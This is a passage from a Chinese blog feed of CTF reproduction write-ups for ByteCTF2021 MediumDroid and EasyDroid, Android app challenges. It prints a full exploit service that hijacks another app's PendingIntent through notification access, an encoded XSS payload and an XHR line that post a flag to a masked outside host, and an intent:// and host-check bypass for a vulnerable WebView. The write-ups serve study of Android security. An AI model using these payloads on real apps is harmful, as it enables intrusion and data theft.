PendingIntent.getBroadcast(this, 0, new Intent(), 0)</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>这个 PendingIntent,被塞进了 Notification,只存在于系统的 NotificationManager 里,不在Intent文件,Binder 接口,公共 API,默认对其他 App 完全不可见</p><p>普通 App 能做到的：发通知（自己发的）,清除通知（自己发的）</p><p>普通 App做不到的：读取其他 App 的通知内容,访问通知里的 PendingIntent,Hook 系统通知列表</p><p>NotificationListenerService 是Android 给系统级通知管理 App开的后门：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MagicService</span></span><br><span class="line">    <span class="keyword">extends</span> <span class="title class_">NotificationListenerService</span></span><br></pre></td></tr></table></figure><p>这是唯一合法拿到别的 App 通知里的 PendingIntent的方式</p><p>MagicService</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.bytectf.pwnmediumdroid;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.app.PendingIntent;</span><br><span class="line"><span class="keyword">import</span> android.app.Service;</span><br><span class="line"><span class="keyword">import</span> android.content.Intent;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.os.IBinder;</span><br><span class="line"><span class="keyword">import</span> android.service.notification.NotificationListenerService;</span><br><span class="line"><span class="keyword">import</span> android.service.notification.StatusBarNotification;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MagicService</span> <span class="keyword">extends</span> <span class="title class_">NotificationListenerService</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MagicService</span><span class="params">()</span> &#123;</span><br><span class="line">        Log.d(<span class="string">&quot;Evil&quot;</span>,<span class="string">&quot;SeviceStart&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onListenerConnected</span><span class="params">()</span> &#123;</span><br><span class="line">        Log.d(<span class="string">&quot;Evil&quot;</span>,<span class="string">&quot;onListenerConnected&quot;</span>);</span><br><span class="line">        <span class="built_in">super</span>.onListenerConnected();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">createSymlink</span><span class="params">()</span> <span class="keyword">throws</span> IOException, InterruptedException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">dataDir</span> <span class="operator">=</span> <span class="string">&quot;/data/data/&quot;</span> + getPackageName();</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;rm -rf &quot;</span> + dataDir + <span class="string">&quot;/files&quot;</span>).waitFor();</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;mkdir &quot;</span> + dataDir + <span class="string">&quot;/files&quot;</span>).waitFor();</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;chmod 777 -R &quot;</span> + dataDir).waitFor();</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;ln -s &quot;</span> + <span class="string">&quot;/data/data/com.bytectf.mediumdroid/files/flag&quot;</span> + <span class="string">&quot; &quot;</span> + dataDir + <span class="string">&quot;/files/symlink.html&quot;</span>).waitFor();</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;chmod 777 -R &quot;</span> + dataDir + <span class="string">&quot;/files&quot;</span>).waitFor();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onNotificationPosted</span><span class="params">(StatusBarNotification sbn)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onNotificationPosted(sbn);</span><br><span class="line">        Log.d(<span class="string">&quot;Evil&quot;</span>,<span class="string">&quot;onNotificationPosted&quot;</span>);</span><br><span class="line">        <span class="type">PendingIntent</span> <span class="variable">pendingIntent</span> <span class="operator">=</span> sbn.getNotification().contentIntent;</span><br><span class="line">        Log.d(<span class="string">&quot;Evil&quot;</span>,<span class="string">&quot;Get PendingIntent&quot;</span> + pendingIntent);</span><br><span class="line"></span><br><span class="line">        <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">        intent.setAction(<span class="string">&quot;com.bytectf.SET_FLAG&quot;</span>);</span><br><span class="line">        intent.setPackage(<span class="string">&quot;com.bytectf.mediumdroid&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">html</span> <span class="operator">=</span> <span class="string">&quot;&lt;img src=\&quot;x\&quot; onerror=\&quot;evaeGhyPW5ldyBYTUxIdHRwUmVxdWVzdCgpOyB4aHIub3BlbignUE9TVCcsICdodHRwOi8veHh4Lnh4eC54eHgueHh4Onh4eCcsIHRydWUpOyB4aHIuc2V0UmVxdWVzdEhlYWRlcignQ29udGVudC1UeXBlJywgJ2FwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCcpOyB4aHIuc2VuZCgnaHRtbD0nICsgZW5jb2RlVVJJQ29tcG9uZW50KGRvY3VtZW50LmRvY3VtZW50RWxlbWVudC5vdXRlckhUTUwpKTs=&#x27;))\&quot;&gt;&quot;</span>;</span><br><span class="line">        intent.putExtra(<span class="string">&quot;flag&quot;</span>,<span class="string">&quot;&lt;html&gt;&quot;</span> + html + <span class="string">&quot;&lt;/html&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            pendingIntent.send(<span class="built_in">this</span>, <span class="number">0</span>, intent, <span class="keyword">new</span> <span class="title class_">PendingIntent</span>.OnFinished() &#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onSendFinished</span><span class="params">(PendingIntent pendingIntent, Intent intent, <span class="type">int</span> i, String s, Bundle bundle)</span> &#123;</span><br><span class="line">                    Log.d(<span class="string">&quot;Evil&quot;</span>,<span class="string">&quot;onSendFinished&quot;</span>);</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        createSymlink();</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;, <span class="literal">null</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (PendingIntent.CanceledException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> IBinder <span class="title function_">onBind</span><span class="params">(Intent intent)</span> &#123;</span><br><span class="line">        Log.d(<span class="string">&quot;evil&quot;</span>,<span class="string">&quot;onBind&quot;</span> );</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.onBind(intent);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onNotificationRemoved</span><span class="params">(StatusBarNotification sbn)</span> &#123;</span><br><span class="line">        Log.d(<span class="string">&quot;evil&quot;</span>,<span class="string">&quot;onNotificationRemoved&quot;</span> );</span><br><span class="line">        <span class="built_in">super</span>.onNotificationRemoved(sbn);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用来 <strong>监听 MediumDroid 发出的通知 → 拿到通知里的 PendingIntent → 篡改 Intent → 以 MediumDroid 身份发送广播 → 触发 FlagReceiver 写 flag → 再制造 symlink 读取 flag</strong>。</p><p>createSymlink:在攻击 App 自己的私有目录里，创建一个指向 MediumDroid flag 文件的符号链接</p><p>onNotificationPosted:任何 App 发通知，都会触发，</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">intent.setAction(<span class="string">&quot;com.bytectf.SET_FLAG&quot;</span>);</span><br><span class="line">intent.setPackage(<span class="string">&quot;com.bytectf.mediumdroid&quot;</span>);</span><br></pre></td></tr></table></figure><p>指定：action &#x3D; FlagReceiver 的 action，package &#x3D; MediumDroid</p><p> <strong>目标：触发非 exported 的 FlagReceiver</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">MediumDroid TestActivity</span><br><span class="line"> ↓</span><br><span class="line">Te3t() 发通知（带空 PendingIntent）</span><br><span class="line"> ↓</span><br><span class="line">MagicService.onNotificationPosted()</span><br><span class="line"> ↓</span><br><span class="line">拿到 PendingIntent</span><br><span class="line"> ↓</span><br><span class="line">fillIn(action + extras)</span><br><span class="line"> ↓</span><br><span class="line">pendingIntent.send()</span><br><span class="line"> ↓</span><br><span class="line">MediumDroid FlagReceiver 被触发</span><br><span class="line"> ↓</span><br><span class="line">flag 文件被写成恶意 HTML</span><br><span class="line"> ↓</span><br><span class="line">onSendFinished()</span><br><span class="line"> ↓</span><br><span class="line">createSymlink()</span><br><span class="line"> ↓</span><br><span class="line">WebView 加载 symlink.html</span><br><span class="line"> ↓</span><br><span class="line">读取 / 外带 flag</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260122215118878.png" alt="image-20260122215118878"></p><p>这里还需要设置一下</p><p>要去系统设置里打开通知监听权限：</p><blockquote><p>设置 → Apps &amp; notifications（或 Notifications）→ Special app access → Notification access → </p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260122221522186.png" alt="image-20260122221522186"></p><p>注意你如果想要持续攻击 切换你编码的那一块的话一定要把之前的攻击删掉再进行</p><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260122222943338.png" alt="image-20260122222943338"></p><blockquote><p>此外不太建议使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xhr.send(&#x27;html=&#x27; + encodeURIComponent(document.documentElement.outerHTML));</span><br></pre></td></tr></table></figure><p>有时无法读出flag 因为需要解析HTML元素</p><p>推荐使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xhr=new XMLHttpRequest(); xhr.open(&#x27;POST&#x27;, &#x27;http://xxxxxx:4080&#x27;, true); xhr.setRequestHeader(&#x27;Content-Type&#x27;, &#x27;application/x-www-form-urlencoded&#x27;); xhr.send(&#x27;html=&#x27; + encodeURIComponent(document.documentElement.innerText));</span><br></pre></td></tr></table></figure></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ByteCTF2021-MediumDroid复现&quot;&gt;&lt;a href=&quot;#ByteCTF2021-MediumDroid复现&quot; class=&quot;headerlink&quot; title=&quot;ByteCTF2021 MediumDroid复现&quot;&gt;&lt;/a&gt;ByteCTF2021</summary>
      
    
    
    
    <category term="Android" scheme="http://matriy330.github.io/categories/Android/"/>
    
    
    <category term="Android" scheme="http://matriy330.github.io/tags/Android/"/>
    
  </entry>
  
  <entry>
    <title>ByteCTF2021 EasyDroid复现</title>
    <link href="http://matriy330.github.io/d5a3f640/"/>
    <id>http://matriy330.github.io/d5a3f640/</id>
    <published>2026-01-21T15:08:09.000Z</published>
    <updated>2026-01-21T15:08:19.831Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ByteCTF2021-EasyDroid复现"><a href="#ByteCTF2021-EasyDroid复现" class="headerlink" title="ByteCTF2021 EasyDroid复现"></a>ByteCTF2021 EasyDroid复现</h1><p>依旧学习<a href="https://blog.lleavesg.top/article/ByteCTF-2021-EasyDroid#b70829973bb54b60be5aeab8dc18c5a5">ByteCTF2021 EasyDroid复现 | LLeaves Blog</a></p><h2 id="APK分析"><a href="#APK分析" class="headerlink" title="APK分析"></a>APK分析</h2><h3 id="AndroidManifest-xml"><a href="#AndroidManifest-xml" class="headerlink" title="AndroidManifest.xml"></a>AndroidManifest.xml</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">manifest</span> <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span> <span class="attr">android:versionCode</span>=<span class="string">&quot;1&quot;</span> <span class="attr">android:versionName</span>=<span class="string">&quot;1.0&quot;</span> <span class="attr">android:compileSdkVersion</span>=<span class="string">&quot;30&quot;</span> <span class="attr">android:compileSdkVersionCodename</span>=<span class="string">&quot;11&quot;</span> <span class="attr">package</span>=<span class="string">&quot;com.bytectf.easydroid&quot;</span> <span class="attr">platformBuildVersionCode</span>=<span class="string">&quot;30&quot;</span> <span class="attr">platformBuildVersionName</span>=<span class="string">&quot;11&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-sdk</span> <span class="attr">android:minSdkVersion</span>=<span class="string">&quot;21&quot;</span> <span class="attr">android:targetSdkVersion</span>=<span class="string">&quot;27&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.INTERNET&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">application</span> <span class="attr">android:theme</span>=<span class="string">&quot;@style/Theme.Easydroid&quot;</span> <span class="attr">android:label</span>=<span class="string">&quot;@string/app_name&quot;</span> <span class="attr">android:icon</span>=<span class="string">&quot;@mipmap/ic_launcher&quot;</span> <span class="attr">android:debuggable</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:allowBackup</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:supportsRtl</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:usesCleartextTraffic</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:roundIcon</span>=<span class="string">&quot;@mipmap/ic_launcher_round&quot;</span> <span class="attr">android:appComponentFactory</span>=<span class="string">&quot;androidx.core.app.CoreComponentFactory&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">&quot;com.bytectf.easydroid.MainActivity&quot;</span> <span class="attr">android:exported</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.action.MAIN&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.category.LAUNCHER&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">&quot;com.bytectf.easydroid.TestActivity&quot;</span> <span class="attr">android:exported</span>=<span class="string">&quot;false&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">receiver</span> <span class="attr">android:name</span>=<span class="string">&quot;com.bytectf.easydroid.FlagReceiver&quot;</span> <span class="attr">android:exported</span>=<span class="string">&quot;false&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;com.bytectf.SET_FLAG&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">receiver</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">application</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br></pre></td></tr></table></figure><table><thead><tr><th>属性</th><th>含义</th><th></th></tr></thead><tbody><tr><td><code>debuggable=&quot;true&quot;</code></td><td>可调试</td><td><strong>可直接用 JDWP &#x2F; Android Studio 调试</strong></td></tr><tr><td><code>allowBackup=&quot;true&quot;</code></td><td>允许 adb 备份</td><td><code>adb backup</code> 可能直接导出数据</td></tr><tr><td><code>usesCleartextTraffic=&quot;true&quot;</code></td><td>允许 HTTP 明文</td><td>抓包 &#x2F; 篡改流量</td></tr></tbody></table><p><code>exported=&quot;true&quot;</code>：任何应用 &#x2F; adb 都能启动它</p><p>如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell am start -n com.bytectf.easydroid/.MainActivity</span><br></pre></td></tr></table></figure><h3 id="MainActivity"><a href="#MainActivity" class="headerlink" title="MainActivity"></a>MainActivity</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.bytectf.easydroid;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.content.Intent;</span><br><span class="line"><span class="keyword">import</span> android.net.Uri;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.webkit.WebView;</span><br><span class="line"><span class="keyword">import</span> android.webkit.WebViewClient;</span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;</span><br><span class="line"><span class="keyword">import</span> java.net.URISyntaxException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* loaded from: classes3.dex */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="comment">/* JADX INFO: Access modifiers changed from: protected */</span></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        <span class="type">Uri</span> <span class="variable">data</span> <span class="operator">=</span> getIntent().getData();</span><br><span class="line">        <span class="keyword">if</span> (data == <span class="literal">null</span>) &#123;</span><br><span class="line">            data = Uri.parse(<span class="string">&quot;http://app.toutiao.com/&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (data.getAuthority().contains(<span class="string">&quot;toutiao.com&quot;</span>) &amp;&amp; data.getScheme().equals(<span class="string">&quot;http&quot;</span>)) &#123;</span><br><span class="line">            <span class="type">WebView</span> <span class="variable">webView</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">WebView</span>(getApplicationContext());</span><br><span class="line">            webView.setWebViewClient(<span class="keyword">new</span> <span class="title class_">WebViewClient</span>() &#123; <span class="comment">// from class: com.bytectf.easydroid.MainActivity.1</span></span><br><span class="line">                <span class="meta">@Override</span> <span class="comment">// android.webkit.WebViewClient</span></span><br><span class="line">                <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">shouldOverrideUrlLoading</span><span class="params">(WebView view, String url)</span> &#123;</span><br><span class="line">                    <span class="type">Uri</span> <span class="variable">uri</span> <span class="operator">=</span> Uri.parse(url);</span><br><span class="line">                    <span class="keyword">if</span> (uri.getScheme().equals(<span class="string">&quot;intent&quot;</span>)) &#123;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            MainActivity.<span class="built_in">this</span>.startActivity(Intent.parseUri(url, <span class="number">1</span>));</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (URISyntaxException e) &#123;</span><br><span class="line">                            e.printStackTrace();</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">return</span> <span class="built_in">super</span>.shouldOverrideUrlLoading(view, url);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">            setContentView(webView);</span><br><span class="line">            webView.getSettings().setJavaScriptEnabled(<span class="literal">true</span>);</span><br><span class="line">            webView.loadUrl(data.toString());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">WebView webView = new WebView(getApplicationContext());</span><br><span class="line">webView.getSettings().setJavaScriptEnabled(true);</span><br><span class="line">webView.loadUrl(data.toString());</span><br></pre></td></tr></table></figure><p>WebView，<strong>JS 开启</strong>，加载可控制的 URL</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">shouldOverrideUrlLoading</span><span class="params">(WebView view, String url)</span> &#123;</span><br><span class="line">    <span class="type">Uri</span> <span class="variable">uri</span> <span class="operator">=</span> Uri.parse(url);</span><br><span class="line">    <span class="keyword">if</span> (uri.getScheme().equals(<span class="string">&quot;intent&quot;</span>)) &#123;</span><br><span class="line">        MainActivity.<span class="built_in">this</span>.startActivity(</span><br><span class="line">            Intent.parseUri(url, <span class="number">1</span>)</span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">super</span>.shouldOverrideUrlLoading(view, url);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>只要 WebView 中出现 <code>intent://</code> 链接</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Uri uri = Uri.parse(url);</span><br></pre></td></tr></table></figure><p>把 URL 字符串解析成 Uri 对象</p><p>用于读取 scheme（协议）、host 等</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if (uri.getScheme().equals(&quot;intent&quot;)) &#123;</span><br></pre></td></tr></table></figure><p>判断 URL 的 scheme 是否是 intent</p><p>intent:&#x2F;&#x2F; 是 Android 特有协议</p><p>用于在网页&#x2F;应用之间触发 Android Intent</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">intent://test#Intent;</span><br><span class="line">action=com.bytectf.SET_FLAG;</span><br><span class="line">S.flag=xxx;</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>App 会 <strong>直接执行 startActivity(Intent)</strong></p><p><strong>没有任何白名单和校验</strong></p><p>此外也存在风险点</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data.getAuthority().contains(&quot;toutiao.com&quot;) &amp;&amp; data.getScheme().equals(&quot;http&quot;)</span><br></pre></td></tr></table></figure><p>如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://toutiao.com</span><br><span class="line">http://app.toutiao.com</span><br><span class="line">http://evil.toutiao.com.attacker.com</span><br></pre></td></tr></table></figure><blockquote><p><strong>在内部校验</strong><code>intent</code> <strong>并且可以进行跳转。因此这里存在攻击点，即可以绕过</strong><code>**getAuthority** </code> <strong>校验加载恶意html，在html内部使用</strong><code>JavaScript</code> <strong>构造重定向请求，然后跳转到指定的非导出Activity</strong></p></blockquote><h3 id="TestActivity"><a href="#TestActivity" class="headerlink" title="TestActivity"></a>TestActivity</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.bytectf.easydroid;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.app.Activity;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.webkit.WebView;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* loaded from: classes3.dex */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestActivity</span> <span class="keyword">extends</span> <span class="title class_">Activity</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// android.app.Activity</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title 